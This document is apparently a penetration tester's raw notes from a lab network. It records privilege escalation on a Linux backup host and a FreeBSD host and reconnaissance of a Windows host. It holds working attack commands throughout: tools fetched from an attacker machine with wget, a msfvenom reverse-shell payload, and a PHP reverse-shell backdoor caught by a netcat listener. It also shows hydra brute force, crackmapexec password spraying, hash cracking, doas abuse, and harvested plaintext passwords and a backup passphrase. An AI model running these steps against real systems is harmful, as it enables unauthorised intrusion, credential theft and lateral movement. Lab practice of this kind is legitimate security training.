chmod +x linpeas.sh

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                  
Sudo version 1.8.31   

═══════════╣ Basic information 
Writable folder: /dev/shm

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                 
Matching Defaults entries for sarah on backup:                                                   
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *
Sudoers file: /etc/sudoers.d/sarah.bak. is readable
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg list *
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg extract *
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg mount *

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester    
[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                    
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*                              
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       128               [::]:22             [::]:*    

╔══════════╣ Analyzing SSH Files (limit 70)                                                      
-rw-r--r-- 1 root root 97 Oct 17  2022 /home/sarah/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESFGA7D4B3Cvr5H8Dng2DvlYrVWwfV/7GWhjAhsWegD tests@hat-work
-rw-r--r-- 1 root root 601 Oct 17  2022 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 173 Oct 17  2022 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Oct 17  2022 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 Oct 17  2022 /etc/ssh/ssh_host_rsa_key.pub
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                           
/home/sarah/local.txt
/home/sarah/.ssh
/home/sarah/.ssh/authorized_keys
/root/

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid     
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)


				LINENUM:
wget http://192.168.45.214:8000/LinEnum.sh 
chmod +x LinEnum.sh 

			CVE-2021-3156: DIDNT WORK 
https://www.google.com/search?q=CVE-2021-3156
https://github.com/worawit/CVE-2021-3156
https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
WinPEAS: Sudo version 1.8.31 
python3 -m http.server 8000
wget http://192.168.45.214:8000/sudo-version-exploit.py
chmod +x sudo-version-exploit.py
python3 sudo-version-exploit.py


			SUDO PERMISSION:  
GTFOBINS:
https://gtfobins.github.io/#
$ sudo -l
User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *
Sudoers file: /etc/sudoers.d/sarah.bak. is readable
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg list *
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg extract *
sarah ALL=(ALL) NOPASSWD:/usr/bin/borg mount *


			PSPY: 
Output shows the BORG password via pspy proccess monitor 
wget http://192.168.45.214:8000/pspy64  
chmod +x pspy64 
./pspy64

2024/05/02 01:29:21 CMD: UID=107   PID=884    | /usr/sbin/uuidd --socket-activation 
2024/05/02 01:29:21 CMD: UID=100   PID=404    | /lib/systemd/systemd-networkd 
2024/05/02 01:45:18 CMD: UID=0     PID=38272  | sleep 15 
2024/05/02 01:45:33 CMD: UID=0     PID=38281  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1714614333 /media/usb0                                                                 
2024/05/02 01:45:33 CMD: UID=0     PID=38280  | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1714614333 /media/usb0                                       
2024/05/02 01:45:33 CMD: UID=0     PID=38282  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1714614333 /media/usb0                                                                 
2024/05/02 01:45:33 CMD: UID=0     PID=38283  | /usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1714614333 /media/usb0                                                                 
2024/05/02 01:45:34 CMD: UID=0     PID=38286  | /bin/bash /root/createbackup.sh 


			BORG: Access 
sudo -l shows we have sudo permissions for /usr/bin/borg
https://borgbackup.readthedocs.io/en/stable/usage/extract.html
usage: borg extract
       [-h]
       [--critical]
       [--error]
       [--warning]
       [--info]
       [--debug]
       [--debug-topic TOPIC]
       [-p]
       [--log-json]
       [--lock-wait SECONDS]
       [--bypass-lock]
       [--show-version]
       [--show-rc]
       [--umask M]
       [--remote-path PATH]
       [--remote-ratelimit RATE]
       [--consider-part-files]
       [--debug-profile FILE]
       [--rsh RSH]
       [--list]
       [-n]
       [--numeric-owner]
       [--nobsdflags]
       [--stdout]
       [--sparse]
       [-e PATTERN]
       [--exclude-from EXCLUDEFILE]
       [--pattern PATTERN]
       [--patterns-from PATTERNFILE]
       [--strip-components NUMBER]
       ARCHIVE
       [PATH [PATH ...]]

TEST:
sarah@backup:~$ sudo /usr/bin/borg extract /opt/borgbackup::usb_1714618894 /media/usb0 --stdout

WORKED:
sarah@backup:~$ sudo /usr/bin/borg extract /opt/borgbackup::home --stdout
Enter passphrase for key /opt/borgbackup: xinyVzoH2AnJpRK9sfMgBA
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
32022-10-17T22:29:47.295286/opt/borgbackup00000000200000a1


			CRACK HASH: 
HASHID: 
┌──(kali㉿kali)-[~]
└─$ hashid "0814b6b7f0de51ecf54ca5b6e6e612bf"  

https://crackstation.net/
Hash	Type	Result
0814b6b7f0de51ecf54ca5b6e6e612bf	md5	backups1


			SU AMY: proof.txt
sarah@backup:~$ su - amy
Password: backups1
$ whoami
amy

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

$ sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
[sudo] password for amy: 

root@backup:/home/amy# id
uid=0(root) gid=0(root) groups=0(root)

root@backup:/home/amy# whoami
root

root@backup:/home/amy# hostname
backup

root@backup:/home/amy# ls
root@backup:/home/amy# cd ..
root@backup:/home# ls
amy  sarah
root@backup:/home# cd ..
root@backup:/# cd root
root@backup:~# ls
config.json  createbackup.sh  proof.txt  rsync.sh  snap

root@backup:~# cat proof.txt
0816de017e8ce0ecec649481e80f4765

root@backup:~# cat config.json
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}

root@backup:~# cat rsync.sh
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.10.20:/etc/ /opt/backup/etc/

root@backup:~# cat createbackup.sh
#!/bin/bash
# Trim the USB backups so we only have the past 20 or so.
USB_BACKUPS=`BORG_PASSPHRASE="xinyVzoH2AnJpRK9sfMgBA" borg list --json /opt/borgbackup/ | jq '.archives | sort_by(.time) | reverse[] | select(.name | startswith("usb"))' | jq -s`

EXTRA_BACKUPS=`echo $USB_BACKUPS | jq -r '. | .[21:] | .[].name'`
for i in ${EXTRA_BACKUPS[@]}
do
    /bin/sh -c "BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg delete /opt/borgbackup::$i"
done

# Back up every 15 :)
for i in 0 1 2
do
    TIME=`date +%s`
    /bin/sh -c "BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_$TIME /media/usb0" 
    sleep 15
done

			ACCESS: .20
ssh andrew@172.16.122.20
Rb9kNokjDsjYyH

			SPRAY AND PRAY: 
amy:backups1
andrew:Rb9kNokjDsjYyH

crackmapexec smb 172.16.122.0/24 -u amy -p 'backups1' --shares
crackmapexec winrm 172.16.122.0/24 -u amy -p 'backups1' --continue-on-success
crackmapexec ldap 172.16.122.0/24 -u amy -p 'backups1' --continue-on-success
NONE

crackmapexec smb 172.16.122.0/24 -u andrew -p 'Rb9kNokjDsjYyH' --shares
crackmapexec winrm 172.16.122.0/24 -u andrew -p 'Rb9kNokjDsjYyH' --continue-on-success
crackmapexec ldap 172.16.122.0/24 -u andrew -p 'Rb9kNokjDsjYyH' --continue-on-success
crackmapexec ssh 172.16.122.0/24 -u andrew -p 'Rb9kNokjDsjYyH' --continue-on-success
SSH         172.16.122.20   22     172.16.122.20    [+] andrew:Rb9kNokjDsjYyH 

--------------------------------------------------------------------------------------------------
		.20 - adnrew:local.txt and proof ✅

┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.20
22/tcp    open  tcpwrapped syn-ack
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
33060/tcp open  socks5     syn-ack
| socks-auth-info: 
|   No authentication
|   No authentication
|_  No authentication
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   Radmin: 
|     authentication.mechanisms
|     MYSQL41
|     SHA256_MEMORY
|     doc.formats
|     text
|     client.interactive
|     compression
|     algorithm
|     deflate_stream
|     lz4_message
|     zstd_stream
|     node_type
|     mysql
|     client.pwd_expire_ok
|   SSLv23SessionReq: 
|     Invalid message-frame."
|_    HY000

				SSH:
hydra -l jim -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l andrea -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l anna -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l brad -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l dan -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l jenny -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l larry -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l michelle -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l milana -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 
hydra -l mountuser -P /usr/share/wordlists/rockyou.txt -s 22 ssh://172.16.128.20 

			Local.tct: Andrew
┌──(kali㉿kali)-[~]
└─$ ssh andrew@172.16.122.20
Rb9kNokjDsjYyH

$ id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew)

$ whoami
andrew

$ hostname
production

$ sudo -l
-sh: sudo: not found

$ ls
local.txt
$ cat local.txt
2c8977643ff59e534acba4fc19d76b9a

$ env
SSH_CLIENT=172.16.122.254 50295 22
LOGNAME=andrew
PAGER=less
MAIL=/var/mail/andrew
PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/home/andrew/bin
EDITOR=vi
ENV=/home/andrew/.shrc
PWD=/usr/home/andrew
TERM=xterm-256color
SSH_TTY=/dev/pts/0
HOME=/home/andrew
USER=andrew
SSH_CONNECTION=172.16.122.254 50295 172.16.122.20 22
SHELL=/bin/sh
BLOCKSIZE=K


$ python -c 'import pty; pty.spawn("/bin/bash")'
-sh: python: not found

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-sh: python3: not found

$ python -c 'import pty; pty.spawn("/bin/sh")'
-sh: python: not found

			NETWORK: 
$ ifconfig
em0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> metric 0 mtu 1500
        options=81249b<RXCSUM,TXCSUM,VLAN_MTU,VLAN_HWTAGGING,VLAN_HWCSUM,LRO,WOL_MAGIC,VLAN_HWFILTER>
        ether 00:50:56:ab:f4:38
        inet 172.16.122.20 netmask 0xffffff00 broadcast 172.16.122.255
        media: Ethernet autoselect (1000baseT <full-duplex>)
        status: active
        nd6 options=29<PERFORMNUD,IFDISABLED,AUTO_LINKLOCAL>
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> metric 0 mtu 16384
        options=680003<RXCSUM,TXCSUM,LINKSTATE,RXCSUM_IPV6,TXCSUM_IPV6>
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x2
        inet 127.0.0.1 netmask 0xff000000
        groups: lo
        nd6 options=21<PERFORMNUD,AUTO_LINKLOCAL>

$ ip route
-sh: ip: not found

$ ss -ntplu
-sh: ss: not found

$ netstat -lntp
netstat: illegal option -- t


			USERS:
$ cat /etc/passwd
# $FreeBSD: releng/12.3/etc/master.passwd 359447 2020-03-30 17:07:05Z brooks $
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
ntpd:*:123:123:NTP Daemon:/var/db/ntp:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
tests:*:977:977:Unprivileged user for tests:/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
andrew:*:1001:1001:Andrew:/home/andrew:/bin/csh
mountuser:*:1002:1002:Mount User:/home/mountuser:/bin/csh
cyrus:*:60:60:the cyrus mail server:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin

$ cat /etc/shadow
cat: /etc/shadow: No such file or directory


			Proof.txt
$ find / -name "*.txt" -ls 2> /dev/null

673944        8 -rw-r--r--    1 root                             andrew                                 33 May  1 20:07 /usr/home/andrew/local.txt

745428        8 -rw-r--r--    1 root                             wheel                                  33 May  1 20:07 /root/proof.txt

$ cat /root/proof.txt
8559f537855bd7fa97683334c552f136

$ find / -name "*.kdbx" -ls 2> /dev/null

$ find / -name "*.git" -ls 2> /dev/null

$ find / -name "*.log" -ls 2> /dev/null
806237        8 drwxr-xr-x    2 root                             wheel                                 512 Dec  6  2018 /usr/ports/devel/py-oslo.log
321255       16 -rw-r-----    1 mysql                            mysql                                4391 May  1 20:07 /var/db/mysql/production-slow.log
321072        8 -rw-r--r--    1 root                             wheel                                2304 May  2 00:37 /var/log/utx.log
322902       24 -rw-------    1 root                             wheel                               11084 May  2 01:02 /var/log/auth.log
322904        8 -rw-------    1 root                             wheel                                 594 Oct 31  2022 /var/log/debug.log
322907        8 -rw-r--r--    1 root                             wheel                                  65 Oct 31  2022 /var/log/devd.log
322911        8 -rw-r-----    1 root                             network                                65 Oct 31  2022 /var/log/ppp.log
322448       48 -rw-r--r--    1 root                             wheel                               20486 Nov  1  2022 /var/log/httpd-error.log
322449       16 -rw-r--r--    1 root                             wheel                                7123 Nov  1  2022 /var/log/httpd-access.log
321107       72 -rw-------    1 root                             wheel                               33900 May  1 20:06 /var/log/vmware-vmtoolsd-root.log
321109      184 -rw-------    1 root                             wheel                               90834 May  1 20:07 /var/log/vmware-vmsvc-root.log
321707       16 -rw-------    1 root                             wheel                                7615 May  1 20:07 /var/log/php-fpm.log
Permission denied

				TTY : FreeBSD
$ su
su: Sorry

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.214 LPORT=5555 -f elf >reverse.elf
wget http://192.168.45.214:8000/reverse.elf -outfile rev.elf

$ ./rev.elf
/bin/sh: ./rev.elf: not found

$ echo $SHELL
/bin/sh

# $FreeBSD: releng/12.3/etc/master.passwd 359447 2020-03-30 17:07:05Z brooks $
/bin/csh

$ cat /etc/shells
# $FreeBSD: releng/12.3/lib/libc/gen/shells 336840 2018-07-28 20:21:23Z brd $
# List of acceptable shells for chpass(1).
# Ftpd will not allow users to connect who are not using
# one of these shells.
/bin/sh
/bin/csh
/bin/tcsh
/usr/local/bin/bash
/usr/local/bin/rbash

https://forums.freebsd.org/threads/your-favorite-shell-in-freebsd.92601/
https://man.freebsd.org/cgi/man.cgi?tcsh(1)
tcsh(1)
csh(1)

https://www.ibm.com/docs/en/zos/2.4.0?topic=descriptions-tcsh-invoke-c-shell
$ tcsh -l
To see the MAC addresses of the NICs on your system, type
        ifconfig -a
                -- Dru <genesis@istar.ca>

andrew@production:/home % ls
andrew          mountuser

andrew@production:/root % ls
proof.txt


andrew@production:~ % cat .history
#+1667314084
exit


			PRIV ESC:
https://sirensecurity.io/blog/linux-privilege-escalation-resources/
https://gtfobins.github.io/#does

Enumerate the machine to check if you can find any writeable directory from which you can transfer the backdoor to elevate your privileges.

Andrew has permission to start the apache24 service. so you can transfer the script to the writable directory and then start the apache24 service and use curl to execute the script.


			Finding SUID Binaries
		https://wiki.archlinux.org/title/Doas
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#wheel-group

OpenDoas is a portable version of OpenBSD's doas command, known for being substantially smaller in size compared to sudo. Like sudo, doas is used to assume the identity of another user on the system. 

$ find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
-rwsr-xr-x  1 root  wheel  1983 Oct  6  2022 /usr/local/bin/doasedit
-rwsr-xr-x  1 root  wheel  5471 Oct  6  2022 /usr/local/bin/vidoas
-rwsr-xr-x  1 root  wheel  29504 Oct  6  2022 /usr/local/bin/doas

			Finding Writable Directories
find / -perm -4000 -ls 2> /dev/null
671233       64 -rwsr-xr-x    1 root                             wheel                               29504 Oct  6  2022 /usr/local/bin/doas

find / -name "doas.conf" -ls 2> /dev/null
673891        8 -rw-r--r--    1 root                             wheel                                 767 Nov  1  2022 /usr/local/etc/doas.conf

Check the doas configuration to identify what you can do with that privilege.

$ cat /usr/local/etc/doas.conf
# Sample file for doas
# Please see doas.conf manual page for information on setting
# up a doas.conf file.

# Permit members of the wheel group to perform actions as root.
permit nopass :wheel

# Permit user alice to run commands a root user.
# permit alice as root

# Permit user bob to run programs as root, maintaining
# environment variables. Useful for GUI applications.
## permit keepenv bob as root

# Permit user cindy to run only the pkg package manager as root
# to perform package updates and upgrades.
## permit cindy as root cmd pkg args update
## permit cindy as root cmd pkg args upgrade

# Allow david to run id command as root without logging it
# permit nolog david as root cmd id

permit nopass andrew as root cmd service args apache24 onestart


	How to start, stop, restart Apache Server on FreeBSD		
	https://www.cyberciti.biz/faq/restart-apache-server-freebsd/

$ /usr/local/etc/rc.d/apache24 restart
Cannot 'restart' apache24. Set apache24_enable to YES in /etc/rc.conf or use 'onerestart' instead of 'restart'.

$ /usr/local/etc/rc.d/apache24 onerestart

$ cat /etc/rc.conf
hostname="production"
#ipv6_network_interfaces="none"
#ipv6_activate_all_interfaces="NO"
defaultroute_delay="0"
sshd_enable="yes"
# Set dumpdev to "AUTO" to enable crash dumps, "NO" to disable
dumpdev="AUTO"
apache24_enable="no"
mysql_enable="yes"
php_fpm_enable="yes"

$ nano /etc/rc.conf
NOT WRITEABLE 


$ service apache24 onestart
Performing sanity check on apache24 configuration:
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 127.0.0.1. Set the 'ServerName' directive globally to suppress this message
Syntax OK
Starting apache24.
limits: setrlimit datasize: Operation not permitted
/usr/local/etc/rc.d/apache24: WARNING: failed to start apache24


			REV SHELL: www
Kali:
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
python3 -m http.server 8000    
nc -lvnp 4444

Target:
wget http://192.168.45.214:8000/rev.php -O /usr/local/www/apache24/data/phpMyAdmin/tmp/backdoor.php
doas service apache24 onestart
curl http://127.0.0.1/phpMyAdmin/tmp/backdoor.php

The incomming shell shold have privileges in order to run the previous command in order to include Andrew to Wheel group

┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.162.191] 63469
FreeBSD production 12.3-RELEASE-p6 FreeBSD 12.3-RELEASE-p6 GENERIC  amd64
USER       TTY      FROM             LOGIN@  IDLE WHAT
andrew     pts/0    172.16.122.254  12:37AM     - curl http://127.0.0.1/phpMyA
uid=80(www) gid=80(www) groups=80(www),0(wheel)

$ whoami
www

# Add user andrew to Wheel
$ /usr/local/bin/doas pw usermod andrew -G wheel

# groupinfo wheel 
$ cat /etc/group 
wheel:*:0:root,www,andrew
daemon:*:1:
kmem:*:2:
sys:*:3:
tty:*:4:
operator:*:5:root
mail:*:6:
bin:*:7:
news:*:8:
man:*:9:
games:*:13:
ftp:*:14:
staff:*:20:
sshd:*:22:
smmsp:*:25:
mailnull:*:26:
guest:*:31:
video:*:44:
bind:*:53:
unbound:*:59:
proxy:*:62:
authpf:*:63:
_pflogd:*:64:
_dhcp:*:65:
uucp:*:66:
dialer:*:68:
network:*:69:
audit:*:77:
www:*:80:
ntpd:*:123:
_ypldap:*:160:
hast:*:845:
tests:*:977:
nogroup:*:65533:
nobody:*:65534:
andrew:*:1001:
mountuser:*:1002:
cyrus:*:60:
mysql:*:88:

see what they're allowed to do in doas.conf

$ /usr/local/bin/doas sh
whoami
root
id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)

Now I just need to read the mountuser creds in /home/mountuser/.history 

cat /home/mountuser/.history
#+1667314347
whoami
#+1667314351
ls
#+1667314352
ls -al
#+1667314356
cd
#+1667314359
ls -al
#+1667314378
vi .mailrc
#+1667314393
ls -al
#+1667314401
vi .profile
#+1667314422
sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21
#+1667314426
exit
#+1667314481
exit

				SPRAY AND PRAY: 
andrew:Rb9kNokjDsjYyH
mountuser:DRtajyCwcbWvH/9 

crackmapexec smb 172.16.122.0/24 -u mountuser -p 'DRtajyCwcbWvH/9' --shares
SMB         172.16.122.254  445    LOGIN            [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.254  445    LOGIN            IPC$            READ            Remote IPC

SMB         172.16.122.5    445    MAIL             [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.5    445    MAIL             IPC$            READ            Remote IPC

SMB         172.16.122.6    445    DC02             [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.6    445    DC02             IPC$            READ            Remote IPC
SMB         172.16.122.6    445    DC02             NETLOGON        READ            Logon server share                                                                                            
SMB         172.16.122.6    445    DC02             SYSVOL          READ            Logon server 

SMB         172.16.122.7    445    INTRANET         [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.7    445    INTRANET         IPC$            READ            Remote IPC

SMB         172.16.122.14   445    WK01             [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.14   445    WK01             IPC$            READ            Remote IPC

SMB         172.16.122.15   445    WK02             [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.15   445    WK02             IPC$            READ            Remote IPC

SMB         172.16.122.21   445    FILES            [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.21   445    FILES            apps            READ            
SMB         172.16.122.21   445    FILES            IPC$            READ            Remote IPC
SMB         172.16.122.21   445    FILES            monitoring      READ            
SMB         172.16.122.21   445    FILES            scripts         READ,WRITE  

SMB         172.16.122.30   445    WEBBY            [+] relia.com\mountuser:DRtajyCwcbWvH/9 
SMB         172.16.122.30   445    WEBBY            IPC$            READ            Remote IPC

crackmapexec winrm 172.16.122.0/24 -u mountuser -p 'DRtajyCwcbWvH/9' --continue-on-success

--------------------------------------------------------------------------------------------------
				.21 - proof only ✅
HTTP: 5985 47001
RPC: 135
SMB: 139 445

┌──(kali㉿kali)-[~]
└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 172.16.128.21

HTTP: 5985 47001
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

RPC:
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

SMB: 
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-04-29T01:45:59
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42663/tcp): CLEAN (Timeout)
|   Check 2 (port 7211/tcp): CLEAN (Timeout)
|   Check 3 (port 17991/udp): CLEAN (Timeout)
